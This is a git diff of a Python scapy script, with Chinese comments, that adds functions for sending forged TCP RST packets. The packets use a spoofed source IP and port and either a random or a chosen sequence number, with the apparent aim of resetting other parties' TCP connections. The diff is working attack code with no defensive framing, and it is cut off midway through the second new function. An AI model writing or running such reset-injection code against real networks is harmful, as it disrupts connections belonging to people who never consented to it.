@@ -1,6 +1,8 @@
 from scapy.all import *
 from scapy.layers.inet import TCP, IP
 
+SEQ_MAX = 4294967296 - 1768515945
+
 
 def send_tcp_rst_random_source(ip, port):
     src_ip = RandIP()
@@ -17,6 +19,19 @@ def send_tcp_rst(source_ip, source_port, ip, port):
     src_port = source_port
     # 创建一个TCP包，设置标志位为RST，序列号为随机值，窗口大小为随机值
     tcp = TCP(sport=src_port, dport=port, flags="R", seq=RandInt(), window=RandShort())
+    # 创建一个IP包，设置目标IP和源IP，标识符为随机值
+    ip = IP(dst=ip, src=src_ip, id=RandShort())
+    # 组合IP包和TCP包
+    pkt = ip / tcp
+    # 发送数据包，并忽略返回值
+    send(pkt, verbose=False)
+
+def send_tcp_rst_plus(source_ip, source_port, ip, port, seq):
+    # 使用对方的源IP和源端口
+    src_ip = source_ip
+    src_port = source_port
+    # 创建一个TCP包，设置标志位为RST，序列号为随机值，窗口大小为随机值
+    tcp = TCP(sport=src_port, dport=port, flags="R", seq=seq, window=RandShort())
     # 创建一个IP包，设置目标IP和源IP，标识符为随机值
     ip = IP(dst=ip, src=src_ip, id=RandShort())
     # 组合IP包和TCP包
